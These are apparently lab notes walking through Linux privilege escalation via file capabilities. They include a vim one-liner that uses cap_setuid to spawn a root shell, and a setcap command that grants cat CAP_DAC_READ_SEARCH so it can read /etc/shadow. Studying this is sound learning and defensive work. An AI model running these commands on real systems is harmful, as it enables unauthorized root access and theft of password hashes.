**Linux Capabilities**

getcap -r / 2>/dev/null >> Command to find capability

<img width="828" height="170" alt="image" src="https://github.com/user-attachments/assets/ec608304-45e1-4d9a-99f3-e47173284bd5" />

***/home/karen/vim = cap_setuid+ep***

Here setuid capability is set on vim. It means we can set uid (User ID) on vim. So vim can define which user id / which user privilege it can run with. It can be karen user or root user vim can run with.

https://gtfobins.org/

<img width="786" height="268" alt="image" src="https://github.com/user-attachments/assets/eee1c0a8-0097-4847-afca-36de79d5823e" />

<img width="786" height="239" alt="image" src="https://github.com/user-attachments/assets/522fe4a2-3079-46de-aadb-471f76e0a64f" />

We can use py or py3 whichever is running on the machine.

./vim -c ‘:py import os; os.setuid(0); os.execl(“/bin/sh”, “sh”, “-c”, “reset; exec sh”)’

./vim -c ‘:py3 import os; os.setuid(0); os.execl(“/bin/sh”, “sh”, “-c”, “reset; exec sh”)’

<img width="786" height="79" alt="image" src="https://github.com/user-attachments/assets/f1be03d0-4e29-4197-872b-ce353489ff64" />

We need to be in the same folder where vim is located.

/home/karen/vim = cap_setuid+ep

<img width="786" height="150" alt="image" src="https://github.com/user-attachments/assets/15cfbe0e-959a-4aee-b310-9f237a25cab3" />

Now let set on capability on any other file and try to exploit it.

<img width="610" height="163" alt="image" src="https://github.com/user-attachments/assets/6dfbb96b-61f7-48fb-b000-78c62755b90c" />

We have copied the cat file in /home/karen folder.

Lets set the capability on cat

**setcap CAP_DAC_READ_SEARCH=+ep /home/karen/cat**

setcap → Tool to set capabilities on executables.

CAP_DAC_READ_SEARCH → The specific capability being granted.

+ep → Add to Effective and Permitted sets.

/path/to/binary → The binary you want to grant this capability to.

<img width="745" height="168" alt="image" src="https://github.com/user-attachments/assets/cc926d2d-0ad2-429c-88f8-c0eef1140949" />

It will grant the binary /home/karen/cat the CAP_DAC_READ_SEARCH capability, allowing it to bypass file and directory read/search permission checks. The cat binary will be able to read any file on the system, even if the user running it does not have permission.

The original cat binary which is under /bin, it dont have the permission to read the /etc/shadow file.

<img width="786" height="136" alt="image" src="https://github.com/user-attachments/assets/9c58cb6c-2148-462a-a0b8-be37f7d58b4b" />

Now lets check with the binary cat which is under /home/karen

<img width="786" height="135" alt="image" src="https://github.com/user-attachments/assets/eecbd659-20db-463e-81f3-bdb6926f95af" />

It has capability to read.

<img width="786" height="258" alt="image" src="https://github.com/user-attachments/assets/01218108-3289-49c9-9b1e-6c0c5fd5d41b" />

We are able to read the /etc/shadow file with cat binary.
